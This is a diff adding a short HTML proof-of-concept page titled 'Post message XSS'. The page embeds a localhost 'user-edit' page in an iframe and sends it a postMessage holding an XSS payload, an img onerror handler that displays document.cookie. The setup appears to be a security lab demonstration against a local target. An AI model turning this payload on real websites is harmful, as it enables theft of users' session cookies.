@@ -1,0 +1,17 @@
+<html>
+<head>
+    <title>Post message xss</title>
+</head>
+<body>
+<script>
+    document.addEventListener('readystatechange', () => {
+        victimWebsite.contentWindow.postMessage("<img src=x onerror=confirm(document.cookie)>", '*');
+    });
+  
+</script>
+
+<h1>Iframe - Post message XSS</h1>
+<iframe src="http://localhost:9000/user-edit" id="victimWebsite" width="100%" height="100%">
+</iframe>
+</body>
+</html>
